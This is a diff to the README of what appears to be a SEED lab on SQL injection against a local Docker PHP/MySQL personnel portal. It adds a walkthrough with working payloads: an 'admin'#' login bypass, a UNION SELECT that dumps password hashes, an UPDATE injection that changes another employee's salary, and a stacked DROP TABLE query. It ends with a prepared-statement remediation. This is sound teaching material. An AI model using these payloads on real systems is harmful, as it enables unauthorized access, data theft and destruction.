@@ -14,52 +14,100 @@ For authorized educational use only.
 
 ---
 
-## Security Concept
+---
 
-### The Security Hole
-The web application constructs database queries by directly concatenating raw user input strings into SQL query templates (`$sql = "SELECT * FROM credential WHERE Name='$user' AND Password='$pass'"`).
+## 📖 The SQL Injection Story: The Corporate Personnel System
 
-### How it Causes a Problem
-Because user input is concatenated directly into the query string, an attacker can input SQL boundary characters like single quotes `'` and comment characters `#`. This alters the database query parse tree, allowing attackers to comment out password checks (`admin'#`), extract unauthorized data using `UNION SELECT`, or modify database tables.
+### Act 1 — The Corporate Employee Portal
+* The fictional company maintains an internal **Personnel Database System** at **`http://localhost:10080`** (`www.seed-server.com:10080`).
+* Employees such as **Ted** (`Salary: $10,000`), **Alice** (`Salary: $20,000`), and **Boby** (`Salary: $30,000`) look up colleagues and access their private salary records.
+* The backend database is MySQL (`sqllab_users`), with tables `credential` (usernames, encrypted passwords, roles) and `employee` (names, SSNs, salaries, phone numbers).
 
-### Attacker Action Flow
+### Act 2 — The Vulnerability (Unsafe String Concatenation)
+The PHP web server constructs SQL queries by directly concatenating raw strings entered into search and login boxes:
+```php
+$sql = "SELECT * FROM credential WHERE Name='$username' AND Password='$password'";
+```
+* If an attacker enters standard text, the query works normally.
+* If an attacker inputs SQL boundary characters (single quote `'`, comment `#` or `--`), the database parser is tricked into treating user data as **executable SQL syntax**.
 
-1. Attacker registers an account on the vulnerable site.
-2. Attacker supplies malicious input `admin'#` in the username field, which truncates the query and comments out the password check.
-3. The crafted input is stored unchanged in the database.
-4. When the application executes the concatenated query, the comment prevents password verification, granting the attacker unauthorized access.
-5. Attacker can now log in as the targeted user without knowing the password.
+### Act 3 — The Exploitation Tasks (As per Official SEED Lab)
 
 ```mermaid
 sequenceDiagram
-    actor Attacker
-    participant Browser
-    participant Apache as Apache/PHP (www-10.9.0.5)
-    participant MySQL as MySQL (mysql-10.9.0.6)
+    autonumber
+    actor Attacker as 🕵️ Attacker
+    participant Web as 🌐 Web App (localhost:10080)
+    participant DB as 🗄️ MySQL (sqllab_users)
 
-    Attacker->>Browser: Enter username: admin'#  password: anything
-    Browser->>Apache: POST /unsafe_home.php  username=admin'%23
-    Note over Apache: Builds query by string concat:
-    Note over Apache: SELECT * FROM credential
-    Note over Apache: WHERE Name='admin'#' AND Password='...'
-    Apache->>MySQL: Executes query (# comments out password check)
-    MySQL-->>Apache: Returns admin's full credential row
-    Apache-->>Browser: Renders admin profile page
-    Browser-->>Attacker: Logged in as admin — no password required
+    Attacker->>Web: 1. Input: admin'# (Password: dummy)
+    Note over Web: Builds: SELECT * FROM credential WHERE Name='admin'#' AND Password='...'
+    Web->>DB: 2. Executes query (# comments out password check)
+    DB-->>Web: 3. Returns Admin record without password match!
+    Web-->>Attacker: 4. Logged in as Administrator!
 ```
 
-```php
- // User inputs: admin'#
- // Unsafe string concatenation builds:
- $sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
- //                                                    ^
- //                                              SQL comment character (#).
- //                                         Everything after # is ignored.
- //                                         Password check is completely bypassed.
- ```
+---
 
-### How it is Fixed
-The application must use parameterized prepared statements (`$stmt = $pdo->prepare(...)`). Prepared statements send the SQL query template to the database engine first to be compiled into an immutable parse tree. User parameters are then bound strictly as literal data values, preventing input characters from altering SQL syntax.
+## 🗄️ Database Forensics: Live Inspection
+
+Inspect the MySQL container to observe tables and record modifications:
+
+```powershell
+# 1. Inspect user credentials table
+docker exec mysql-10.9.0.6 mysql -u root -pdees sqllab_users -e "SELECT id, Name, Password, Role FROM credential;"
+
+# 2. Inspect employee salary and personnel table
+docker exec mysql-10.9.0.6 mysql -u root -pdees sqllab_users -e "SELECT Eid, Name, Salary, SSN, PhoneNumber FROM employee;"
+```
+
+---
+
+## 🧪 Official Lab Tasks Walkthrough
+
+### Task 1 — Familiarization with MySQL CLI
+Log in to the database container and practice running standard queries:
+```powershell
+docker exec -it mysql-10.9.0.6 mysql -u root -pdees sqllab_users
+```
+```sql
+SELECT * FROM credential WHERE Name='Alice';
+SELECT * FROM employee WHERE Salary > 15000;
+```
+
+### Task 2 — SQL Injection on SELECT Statements
+* **Task 2.1: Login Authentication Bypass**
+  * Target: Login Form
+  * Input in Username: `admin'#` or `admin' -- `
+  * Input in Password: any text
+  * **Result:** Password check is commented out; attacker logs in as Admin.
+* **Task 2.2: Employee Search Data Exfiltration via `UNION SELECT`**
+  * Target: Employee Search box
+  * Input: `' UNION SELECT 1, Name, Password, 4, 5, 6 FROM credential #`
+  * **Result:** Dumps secret password hashes from the `credential` table directly into the public search results.
+
+### Task 3 — SQL Injection on UPDATE Statements
+* **Task 3.1: Modifying Salary Records**
+  * Target: Edit Profile / Nickname form
+  * Input in Nickname: `test', Salary='999999' WHERE Name='Alice'; -- `
+  * **Result:** Alice's salary in the `employee` table is forcefully updated to $999,999.
+
+### Task 4 — SQL Injection on Multi-Statements
+* In systems with multi-query support (`mysqli::multi_query`), entering `; DROP TABLE dummy_table;` executes stacked queries sequentially.
+
+---
+
+## 🛡️ Step-by-Step Remediation: Parameterized Prepared Statements
+
+The vulnerability is eliminated by compiling the SQL structure before binding data:
+
+```php
+// SECURE: Database compiles the template first; data can NEVER alter query syntax
+$stmt = $conn->prepare("SELECT * FROM credential WHERE Name=? AND Password=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+$result = $stmt->get_result();
+```
 
 ---
 
